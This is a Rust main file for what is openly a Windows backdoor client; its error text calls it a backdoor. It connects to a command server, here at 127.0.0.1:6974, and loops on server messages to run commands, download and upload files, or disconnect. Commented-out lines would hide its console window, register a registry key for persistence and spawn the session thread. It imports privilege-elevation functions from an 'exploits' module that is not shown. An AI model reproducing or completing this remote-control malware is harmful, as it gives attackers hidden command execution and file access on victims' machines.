// #![windows_subsystem = "windows"]

mod exploits;
mod stprotocol;
mod structure;

use crate::structure::StructStone;
use exploits::{is_elevated, setup_registry, try_run_as_admin, Exploits, HandleExploits};
use std::thread;
use stprotocol::{Client, HandleSession};
use structure::{Detector, Generator, StoneTransferProtocol};

fn main() {
    // match setup_registry() {
    //     Ok(_) => {}
    //     Err(_) => eprintln!(
    //         "Exploit Failure: Failed to register registry key, resulting in insecure execution."
    //     ),
    // }

    // let handle_server = thread::spawn(|| event_loop());

    // handle_server
    //     .join()
    //     .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
    event_loop()
}

fn event_loop() {
    let mut client = HandleSession::new("127.0.0.1:6974".to_string(), Exploits::default());
    let mut result: Result<(), ()>;

    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문
        result = match client.receiving(StructStone::default()).get_type() {
            StoneTransferProtocol::Connection => {
                println!("Connection OK");
                Ok(())
            }
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd =>
                // 타입이 ExecuteCmd 일 경우
                client.exploit(),

            StoneTransferProtocol::Download =>
                // 타입이 Download 일 경우
                client.download(),

            StoneTransferProtocol::Upload =>
                // 타입이 Upload 일 경우
                client.upload(),

            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };

        match result {
            Ok(_) => continue,
            Err(_) => client.HandleConnectionLoss()
        };
    }

}
